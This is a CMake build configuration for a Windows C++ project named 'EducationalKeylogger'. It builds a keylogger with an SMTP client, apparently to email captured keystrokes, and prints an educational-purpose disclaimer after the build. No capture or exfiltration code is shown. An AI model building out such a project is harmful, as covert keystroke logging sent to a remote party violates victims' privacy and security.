cmake_minimum_required(VERSION 3.10)
project(EducationalKeylogger VERSION 1.0)

# Specify C++ standard
set(CMAKE_CXX_STANDARD 14)
set(CMAKE_CXX_STANDARD_REQUIRED True)

# Include directories
include_directories(include)

# Add source files
set(SOURCES
    src/main.cpp
    src/KeyLogger.cpp
    src/SmtpClient.cpp
)

# Add executable
add_executable(Keylogger ${SOURCES})

# Link Windows libraries
target_link_libraries(Keylogger ws2_32 wininet)

# Add disclaimer
add_custom_command(TARGET Keylogger POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E echo "EDUCATIONAL PURPOSE ONLY: This software is provided for educational purposes only.") 